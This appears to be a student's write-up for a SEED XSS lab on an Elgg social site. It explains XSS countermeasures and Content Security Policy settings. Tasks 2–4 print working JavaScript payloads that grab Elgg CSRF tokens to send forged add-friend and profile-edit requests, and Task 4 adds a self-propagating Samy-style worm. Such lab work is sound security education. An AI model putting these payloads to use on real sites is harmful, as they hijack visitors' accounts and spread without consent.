# Background
## What is XSS attack?
![[Drawing 2023-11-20 15.57.56.excalidraw|650]]
## Countermeasures
1. Sanitize(Filter): The goal for this countermeasure is to remove the code from user's inputs. Usually, the malicious code are embedded with a script tag. Therefore, by deleting this tag, the malicious code can be treated as normal text. 
2. Encoding: Similar to the first method, we can use the ASCII characters to treat the tag brackets '<' and '>' as characters by encoding them. It can also make the malicious code be text. 
3. Content Security Policy: This is a method to control the script usage of the files. For example, we can only allow the website use the same source script. We can also restrict the inline script with nonces to prevent users from using unknown source scripts. 
# Task 1
## Results and Screenshots
Input: 
`<script>alert('xss')</script>` 
Output: 
![[Pasted image 20231120123001.png|650]]
## Explanation
For the website input, it has a "Edit HTML" button which allows the users to input the HTML tags directly without sanitizing them. Therefore, if we put script tags inside the input box, the website would run the code between the script tags. When we click the save button, it will also put everything into the database as the script tag, which means every user who access this page will automatically run the not sanitized code. 
# Task 2
## Results and Screenshots
Captured: 
`http://www.seed-server.com/action/friends/add? friend=59&__elgg_ts=1700483477&__elgg_token=Blz_SXdDF3os1joxJsVvyw&_ _elgg_ts=1700483477&__elgg_token=Blz_SXdDF3os1joxJsVvyw`
Script: 
```
<script type="text/javascript">
window.onload = function () {
var Ajax=null;
var ts="&__elgg_ts="+elgg.security.token.__elgg_ts; var token="&__elgg_token="+elgg.security.token.__elgg_token;  
var sendurl= "http://www.seed-server.com/action/friends/add? friend=59"+ts+token+ts+token; 
Ajax=new XMLHttpRequest(); 
Ajax.open("GET", sendurl, true); 
Ajax.send(); 
}
</script>
```
Alice's account automatically sent the request: (When refresh, the button automatically changed from "Add Friend" to "Remove Friend")
![[Pasted image 20231120125238.png|650]]
## Questions
1. Question 1: Explain the purpose of (1) and (2), why are they needed? 
Answer: The website contains countermeasures regarding the CSRF attack. The token and the timestamp are used as a verification of user's status. Therefore, the two lines are used to directly extract the CSRF token and timestamp to the variable to use them easily. 
2.  If the Elgg application only provides the Rich Text Editor mode for the "About Me" field, i.e., you cannot switch to the Text mode (“Edit HTML”), can you still launch a successful attack?
Answer: Yes. Usually, the Rich Text Editor contains safety measures to clear the malicious input. They usually intend to delete HTML tags inside the user input. However, we can directly modify the content in the input tag to avoid the additional verification. 
# Task 3
## Results and Screenshots
Input: 
```
<script type="text/javascript">
window.onload = function(){
//JavaScript code to access user name, user guid, Time Stamp
__elgg_ts
//and Security Token __elgg_token
var userName="&name="+elgg.session.user.name;
var guid="&guid="+elgg.session.user.guid;
var ts="&__elgg_ts="+elgg.security.token.__elgg_ts;
var token="&__elgg_token="+elgg.security.token.__elgg_token;
//Construct the content of your url.
var content="&description=<p>samy is my
hero</p>"+ts+token+userName+guid; //FILL IN
var samyGuid=59; //FILL IN
var sendurl="http://www.seed-server.com/action/profile/edit"; 
if(elgg.session.user.guid!=samyGuid)
{
//Create and send Ajax request to modify profile
var Ajax=null;
Ajax=new XMLHttpRequest();
Ajax.open("POST", sendurl, true);
Ajax.setRequestHeader("Content-Type",
"application/x-www-form-urlencoded");
Ajax.send(content);
}
}
</script>
```
When Alice is accessing Samy's web page, we can see the request is automatically sent.![[Pasted image 20231120132828.png|650]]Alice's profile after visit Samy's Profile: 
![[Pasted image 20231120132859.png|650]]
## Questions
3. Why do we need Line (1)? If we do not add this check, can the attack be successful? How come we do not have such a check in the add-friend attack (add_friend.js)? 
Answer: If we do not add this check, when Samy is checking his own page, the malicious code may copy the text "Samy is my hero" to his own profile, which will overwrite the malicious content. For add_friend.js, the malicious code does not do any overwrite, it only send the get request to the server to add Samy as friend. When Samy access the server, the server would not accept a request that add himself as a friend. Therefore, adding this if statement or not will not influence the result of the attack. 
# Task 4
## Results and Screenshots
Input: 
```
<script id="worm">
var headerTag = "<script id=\"worm\" type=\"text/javascript\">";
var jsCode = document.getElementById("worm").innerHTML; 
var tailTag = "</" + "script>"; 
var wormCode = encodeURIComponent(headerTag + jsCode + tailTag);
alert(jsCode);
window.onload = function(){
userName="&name="+elgg.session.user.name; var guid="&guid="+elgg.session.user.guid; var ts="&__elgg_ts="+elgg.security.token.__elgg_ts; var token="&__elgg_token="+elgg.security.token.__elgg_token; 
var content="&description="+wormCode+ts+token+userName+guid; 
var samyGuid=59; 
var sendurl="http://www.seed-server.com/action/profile/edit"; 
if(elgg.session.user.guid!=samyGuid) { 
var Ajax=null; 
Ajax=new XMLHttpRequest(); 
Ajax.open("POST", sendurl, true); 
Ajax.setRequestHeader("Content-Type", "application/x-www-form-urlencoded"); 
Ajax.send(content); } 
}
```
Samy's Profile: (After put the worm)
![[Pasted image 20231120154213.png]]
Alice Profile (Before put the worm):
![[Pasted image 20231120135306.png]]
Alice Profile (After visit Samy's Profile):
![[Pasted image 20231120154139.png]]
Boby Profile (Before visit Alice's Profile):
![[Pasted image 20231120154426.png]]
Boby Profile (After visit Alice's Profile):
![[Pasted image 20231120154514.png]]
## Explanation
The Self-Propagating XSS worm uses DOM's API to access the malicious code on the tree, which is basically itself. In this case, the code use headerTag variable references the script header, jsCode references the code itself, and the tailTag variable to reconstruct the same content. Then, it extends the previous task's content to replicate itself to anyone who visits this profile. 

# Task 5
## Results and Screenshots
![[Pasted image 20231120155203.png|650]]
![[Pasted image 20231120155241.png|650]]
![[Pasted image 20231120155305.png|650]]
## Questions
4. All the areas in the 32a website show OK, and it does not apply any CSP features. 
    The area 4 and 6 in the 32b website works, and it only allows the website to load from the same source and the example70.com source. 
    The area 1, 4 and 6 in the 32c website show OK, and it only allows the website to load from the strategy listed in phpindex.php. In this PHP file, it shows that this website can only load resources from self, 111-111-111 nonce and example70.com.
5. ```# Purpose: Setting CSP policies in Apache configuration <VirtualHost *:80> DocumentRoot /var/www/csp ServerName www.example32b.com DirectoryIndex index.html Header set Content-Security-Policy " \ default-src 'self'; \ script-src 'self' *.example70.com *.example60.com\ " </VirtualHost>```
   To allow area 5, which is the example60.com, be loaded, we need to modify the security policy to allow the example60.com be one of the sources by adding `*.example60.com\`
   ![[Pasted image 20231120222736.png|650]]
6. 
```
<?php
  $cspheader = "Content-Security-Policy:".
               "default-src 'self';".
               "script-src 'self' 'unsafe-inline' *.example60.com *.example70.com;".
               "";
  header($cspheader);
?>

<?php include 'index.html'; ?>
```
In this question, the PHP file is part of the CSP header. In this script, the 111-111-111 and 222-222-222 is not specified, so we do not have any restriction to the nonces. We used `unsafe-inline` to prevent the insecure inline nonce. We also uses the 